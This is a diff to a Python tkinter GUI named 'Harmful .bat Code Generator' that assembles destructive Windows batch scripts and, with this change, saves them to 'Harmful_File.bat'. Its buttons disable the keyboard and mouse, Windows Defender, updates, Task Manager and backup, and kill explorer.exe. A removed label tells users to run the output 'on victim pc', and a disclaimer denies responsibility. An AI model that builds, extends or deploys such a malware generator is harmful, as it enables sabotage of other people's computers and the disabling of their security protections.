@@ -1,16 +1,12 @@
 from tkinter import *
-# from PIL import ImageTk, Image
-# import os
 
 window=Tk()
 
-window.title(".bat Code Generator - v1.0 by ZeaCeR#5641") # title bar
+window.title(".bat Code Generator - v1.3 by ZeaCeR") 
 
-window['background'] = '#333333' # background color
+window['background'] = '#333333' 
 
-window.resizable(0,0) # this disables resizing the window
-
-# window.iconbitmap("D:\development\Python\BAT VIrus Maker\icon.ico")
+window.resizable(0,0)
 
 def echo_off():
     echooff="@ echo off \n"
@@ -505,6 +501,13 @@ start "" invisi.vbs
 rem ---------------------------------""" + "\n"
     tmain.insert(END,killprocessexplorer)
 
+def generatefileandsave():
+    contentToWrite = tmain.get("1.0", "end")
+    filesaved = open("Harmful_File.bat", "w")
+    filesaved.write(contentToWrite)
+    filesaved.close()
+    
+
 l1=Label(window,text=" Harmful .bat Code Generator", bg='#333333', fg='#FFFFFF')
 l1.grid(row=0,column=0,columnspan=4)
 
@@ -574,7 +577,7 @@ bconfusefileextions.grid(row=8,column=2)
 bkillexplorer=Button(window,text="Kill Explorer", command=kill_explorer_exe, width=16, bg='#E45F43', fg='#FFFFFF')
 bkillexplorer.grid(row=8,column=3)
 
-bcleartextinprogam=Button(window,text="Clear", command=clear_text_in_program, width=45, bg='#FF0000', fg='#FFFFFF')
+bcleartextinprogam=Button(window,text="Clear", width=45, command=clear_text_in_program, bg='#FF0000', fg='#FFFFFF')
 bcleartextinprogam.grid(row=2,column=0)
 
 bdisablekeybandmouse=Button(window,text="Disable Mouse and Keyboard", command=disable_mouse_and_keyboard, width=45, bg='#E45F43', fg='#FFFFFF')
@@ -586,29 +589,17 @@ bdisablewindowsupdatessecuirtydefender.grid(row=4,column=0)
 bdisableadmintskmgrwinbackup=Button(window,text="Disable tskmgr, Admin, Win Backup", command=disable_win_backup_tskmgr_admin, width=45, bg='#E45F43', fg='#FFFFFF')
 bdisableadmintskmgrwinbackup.grid(row=5,column=0)
 
-label4=Label(window,text="save the code as a .bat file and run on victim pc", bg='#333333', fg='#FFFFFF')
-label4.grid(row=6,column=0)
+# label4=Label(window,text="save the code as a .bat file and run on victim pc", bg='#333333', fg='#FFFFFF')
+# label4.grid(row=7,column=0)
 
-label2=Label(window,text="This is made by ZeaCeR#5641", bg='#333333', fg='#FFFFFF')
+label2=Label(window,text="This is made by ZeaCeR", bg='#333333', fg='#FFFFFF')
 label2.grid(row=7,column=0)
 
-label3=Label(window,text="V1.0 - I am not responsible for anything done with this", bg='#333333', fg='#FFFFFF')
+bsavethegeneratedCode = Button(window,text="Save generated code", command=generatefileandsave ,width=45, bg='#E45F43', fg='#FFFFFF')
+bsavethegeneratedCode.grid(row=6,column=0)
+
+label3=Label(window,text="V1.3 - I am not responsible for anything done with this", bg='#333333', fg='#FFFFFF')
 label3.grid(row=8,column=0)
-
-
-# this is for the image
-
-# img = ImageTk.PhotoImage(Image.open("D:\development\Python\BAT VIrus Maker\left.png"))
-# panel = Label(window, image = img, width=200, bg='#333333', fg='#FFFFFF', justify=LEFT)
-# panel.grid(row=1,column=1)
-# need to find out how this works
-# idk lol
-
-
-
-
-
-
 
 
 window.mainloop()
